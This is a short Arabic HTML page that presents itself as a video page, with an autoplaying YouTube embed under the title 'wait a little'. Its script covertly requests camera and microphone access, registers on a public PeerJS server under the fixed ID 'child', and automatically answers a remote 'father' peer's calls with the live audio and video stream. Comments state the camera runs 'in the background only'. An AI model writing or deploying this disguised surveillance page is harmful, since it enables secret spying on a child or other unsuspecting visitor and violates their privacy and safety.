<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title> قليلا انتظر </title>
</head>
<body>

<h2>فيديو </h2>

<!-- فيديو يوتيوب فقط -->
<iframe width="560" height="315"
    src="https://www.youtube.com/embed/xuGCHkZSOiU?autoplay=1&mute=1"
    title="YouTube video"
    frameborder="0"
    allow="autoplay; encrypted-media"
    allowfullscreen>
</iframe>

<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
<script>
let peer, stream;

// بدء الكاميرا في الخلفية فقط
function startCamera(){
  navigator.mediaDevices.getUserMedia({
    video: true,
    audio: true
  }).then(s => {
    stream = s;

    // الرد على مكالمات الأب مباشرة
    peer.on("call", call => call.answer(stream));

  }).catch(() => alert("لم يتم السماح للكاميرا"));
}

window.onload = () => {
  // معرف ثابت للطفل
  peer = new Peer("child", {
    host: "peerjs.com",
    secure: true,
    port: 443
  });

  peer.on("open", () => {
    startCamera();
  });
}

// إيقاف الكاميرا عند غلق الصفحة
window.onbeforeunload = () => {
  if(stream) stream.getTracks().forEach(t => t.stop());
  peer && peer.destroy();
};
</script>

</body>
</html>
